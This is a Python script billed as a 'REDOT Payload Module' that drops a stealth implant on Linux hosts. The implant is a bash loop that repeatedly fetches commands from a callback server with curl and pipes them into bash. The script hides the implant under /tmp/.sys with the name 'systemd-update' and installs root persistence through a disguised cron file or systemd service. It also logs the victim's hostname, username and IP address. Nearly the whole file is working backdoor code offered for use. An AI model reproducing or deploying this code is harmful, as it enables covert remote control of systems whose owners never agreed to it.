#!/usr/bin/env python3
"""
implant_dropper.py - REDOT Payload Module
Drops a stealth implant with persistence and remote callback functionality.
"""

import os
import platform
import shutil
import socket
import getpass
import uuid
from pathlib import Path
import subprocess

# Configuration
IMPLANT_NAME = "systemd-update"
CALLBACK_HOST = ""  # Will be auto-detected if empty
CALLBACK_PORT = 8443
PERSIST_METHOD = "cron"  # or 'systemd'
INSTALL_DIR = "/tmp/.sys"
AGENT_LOG = "logs/implants/agents.log"
CRON_FILE = "/etc/cron.d/systemd-update"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def detect_os():
    return platform.system()

def build_implant(callback_ip, callback_port):
    implant_code = f"""#!/bin/bash
while true; do
  curl -k https://{callback_ip}:{callback_port}/cmd -H "X-Agent-ID: $(hostname)-$(whoami)" | bash
  sleep 30
done
"""
    os.makedirs(INSTALL_DIR, exist_ok=True)
    implant_path = os.path.join(INSTALL_DIR, IMPLANT_NAME)
    with open(implant_path, "w") as f:
        f.write(implant_code)
    os.chmod(implant_path, 0o755)
    return implant_path

def install_persistence(implant_path):
    if PERSIST_METHOD == "cron":
        cron_line = f"* * * * * root {implant_path} >/dev/null 2>&1\n"
        with open(CRON_FILE, "w") as f:
            f.write(cron_line)
        print(f"[+] Persistence installed via cron: {CRON_FILE}")
    elif PERSIST_METHOD == "systemd":
        service_file = f"""/etc/systemd/system/{IMPLANT_NAME}.service"""
        service_content = f"""[Unit]
Description=System Update Service

[Service]
ExecStart={implant_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
        with open(service_file, "w") as f:
            f.write(service_content)
        subprocess.run(["systemctl", "daemon-reexec"])
        subprocess.run(["systemctl", "enable", f"{IMPLANT_NAME}.service"])
        subprocess.run(["systemctl", "start", f"{IMPLANT_NAME}.service"])
        print(f"[+] Persistence installed via systemd: {service_file}")

def log_agent_info():
    os.makedirs("logs/implants", exist_ok=True)
    with open(AGENT_LOG, "a") as f:
        f.write(f"{uuid.uuid4()} | {socket.gethostname()} | {getpass.getuser()} | {get_local_ip()}\n")

def drop_implant():
    print("[*] Dropping implant...")
    ip = CALLBACK_HOST if CALLBACK_HOST else get_local_ip()
    implant_path = build_implant(ip, CALLBACK_PORT)
    install_persistence(implant_path)
    log_agent_info()
    print("[✓] Implant deployed and persistence installed.")

if __name__ == "__main__":
    drop_implant()
